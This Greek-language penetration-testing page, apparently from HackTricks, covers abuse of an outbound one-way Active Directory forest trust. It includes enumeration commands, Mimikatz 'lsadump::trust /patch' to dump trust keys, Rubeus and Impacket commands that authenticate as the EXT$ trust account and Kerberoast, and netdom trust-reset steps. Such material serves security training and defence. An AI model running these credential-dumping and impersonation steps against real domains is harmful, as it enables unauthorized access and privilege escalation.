# Εξωτερικός Forest Domain - One-Way (Outbound)

{{#include ../../banners/hacktricks-training.md}}

Σε αυτό το σενάριο **το domain σου** **εμπιστεύεται** ορισμένα **προνόμια** σε principals από ένα **διαφορετικό domain/forest**.

## Απαρίθμηση

### Outbound Trust
```bash
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
Αν έχετε διαθέσιμο το AD module, επιθεωρήστε επίσης απευθείας το **Trusted Domain Object (TDO)**. Αυτό σας δίνει τα ακατέργαστα trust data που βασίζονται σε LDAP και θα χρειαστείτε αργότερα όταν αποφασίζετε αν η εύκολη διαδρομή είναι **FSP/group abuse** ή **trust-account abuse**:
```powershell
# Enumerate the TDO created for the foreign forest/domain
Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' -SearchBase "CN=System,$((Get-ADDomain).DistinguishedName)" -Properties trustDirection,trustType,trustAttributes,flatName,securityIdentifier,whenCreated,whenChanged |
Select Name,flatName,trustDirection,trustType,trustAttributes,securityIdentifier,whenCreated,whenChanged

# Fast trust hygiene check from the outbound side
Get-ADTrust -Identity ext.local -Properties ForestTransitive,SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation
```
You should also enumerate where the foreign principals from `CN=ForeignSecurityPrincipals` were actually granted access. Common wins are:

- **Local admin** on a server/DC in your current domain
- Membership in a **custom domain group** that has ACLs over users/computers/GPOs
- Rights to modify **computer objects**, which can later become [RBCD](resource-based-constrained-delegation.md) if the trust configuration allows it

## Trust Account Attack

When a one-way trust is created from domain/forest **B** to domain/forest **A** (**B trusts A**), a **trust account** for **B** is created in **A**. In the outbound-trust view of **A**, this is useful because if you later compromise **B** (the trusting side), you can dump the trust secret there and authenticate back to **A** as `B$`.

The critical aspect to understand here is that the password and Kerberos material for that trust account can be extracted from a Domain Controller in the **trusting** domain using:
```bash
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Αυτό λειτουργεί επειδή ο trust account που δημιουργείται στο **trusted** domain είναι ένα enabled principal που καταλήγει να έχει τα βασικά rights ενός κανονικού domain user εκεί. Αυτό συχνά αρκεί για να ξεκινήσεις enumerating LDAP, request tickets και να βρεις το επόμενο escalation path.

Σε ένα scenario όπου το `ext.local` είναι το **trusting** domain και το `root.local` είναι το **trusted** domain, δημιουργείται ένας user account με το όνομα `EXT$` μέσα στο `root.local`. Το dumping των trust keys από το `ext.local` αποκαλύπτει credentials που μπορούν να χρησιμοποιηθούν ως `root.local\EXT$` εναντίον του `root.local`:
```bash
lsadump::trust /patch
```
Ακολουθώντας αυτό, χρησιμοποιήστε το εξαγόμενο **RC4** key για να αυθεντικοποιηθείτε ως `root.local\EXT$` μέσα στο `root.local`:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Στη συνέχεια, απαριθμήστε το trusted domain ως εκείνο το principal, για παράδειγμα κάνοντας Kerberoasting σε ένα υψηλής αξίας SPN στο `root.local`:
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Από Linux

Αν ανακτήσατε το **RC4** trust-account key, η ίδια ιδέα λειτουργεί από Linux με το Impacket:
```bash
python getTGT.py -dc-ip dc.root.local root.local/EXT\$ -hashes :<RC4>
export KRB5CCNAME=EXT\$.ccache

# Kerberoast from the trusted domain as the trust account
GetUserSPNs.py -request -k -no-pass -dc-ip dc.root.local root.local/EXT\$ -outputfile root_spns.kerberoast

# Or reduce noise and request only one user
GetUserSPNs.py -request-user svc_sql -k -no-pass -dc-ip dc.root.local root.local/EXT\$
```
Αν το **RC4** δεν γίνεται αποδεκτό, κάνε fallback στο ανακτημένο **cleartext password** (ή στα παραγόμενα **AES** keys) και επαναχρησιμοποίησε τα συνήθη workflows [Over-Pass-the-Hash / Pass-the-Key](over-pass-the-hash-pass-the-key.md) και [Kerberoast](kerberoast.md) από αυτό το foothold.

### Key material gotchas

Μην μπερδεύεις τα **trust keys** με τα **trust-account credentials**:

- Σε ένα one-way trust, και οι δύο πλευρές αποθηκεύουν ένα **TDO**, αλλά το πραγματικό **`EXT$` user account υπάρχει μόνο στο trusted domain**.
- Το τρέχον trust-account password αντικατοπτρίζεται στο TDO trust secret (`NewPassword` / current trust key).
- Το **RC4** trust key είναι το πιο εύκολο artifact για επαναχρησιμοποίηση στο `asktgt` ως trust account· σε default setups αυτό είναι συνήθως το working enctype, επειδή το trust account συχνά έχει κενό `msDS-SupportedEncryptionTypes`.
- Αν σκέφτεσαι με όρους **AES trust keys**, θυμήσου ότι δεν είναι εναλλάξιμα με τα trust-account AES keys, επειδή τα salts διαφέρουν.

Άρα, για την technique σε αυτή τη σελίδα, προτίμησε είτε το dumped **RC4** material είτε το ανακτημένο **cleartext** password.

### Gathering cleartext trust password

Στο προηγούμενο flow χρησιμοποιήθηκε το trust hash αντί για το **cleartext password** (το οποίο επίσης **dumped by mimikatz**).

Το cleartext password μπορεί να ληφθεί μετατρέποντας το \[ CLEAR ] output από το mimikatz από hexadecimal και αφαιρώντας τα null bytes `\x00`:

![Trust Account Attack - Gathering cleartext trust password: The cleartext password can be obtained by converting the ( CLEAR ) output from mimikatz from hexadecimal and removing null...](<../../images/image (938).png>)

Μερικές φορές, όταν δημιουργείται μια trust relationship, πρέπει ο χρήστης να πληκτρολογήσει ένα password για το trust. Σε αυτή την επίδειξη, το key είναι το αρχικό trust password και επομένως αναγνώσιμο από άνθρωπο. Καθώς το key αλλάζει (default: every 30 days), το cleartext συνήθως παύει να είναι αναγνώσιμο από άνθρωπο, αλλά παραμένει τεχνικά usable.

Το cleartext password μπορεί να χρησιμοποιηθεί για να γίνει regular authentication ως trust account, ως εναλλακτική στο να ζητηθεί ένα TGT με το Kerberos secret key του trust account. Εδώ, querying `root.local` από `ext.local` για μέλη των `Domain Admins`:

![Trust Account Attack - Gathering cleartext trust password: The cleartext password can be used to perform regular authentication as the trust account, an alternative to requesting a TGT...](<../../images/image (792).png>)

### Practical limitations

> [!WARNING]
> Trust accounts are awkward principals. Interactive logons such as **RUNAS / console / RDP** are not the expected path here, and **NTLM** authentication attempts can fail with `STATUS_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT`. Plan for **Kerberos network logons** (`asktgt`, LDAP, CIFS, Kerberoast) instead.

### Persistence / cleanup note

Αν οι defenders αντιληφθούν ότι το trusting domain έχει παραβιαστεί, θα πρέπει να κάνουν rotate το trust secret και στις **δύο πλευρές** με `netdom trust ... /resetOneSide ...`. Από πλευράς operator αυτό έχει σημασία επειδή ένα **manual reset invalidates the old trust material immediately**, ενώ η κανονική trust-password rotation κρατά τα current/previous values διαθέσιμα κατά τη διάρκεια του rollover.
```bash
# Run once from the trusted side
netdom trust root.local /domain:ext.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*

# Run once from the trusting side
netdom trust ext.local /domain:root.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*
```
## Αναφορές

- [https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust)

{{#include ../../banners/hacktricks-training.md}}
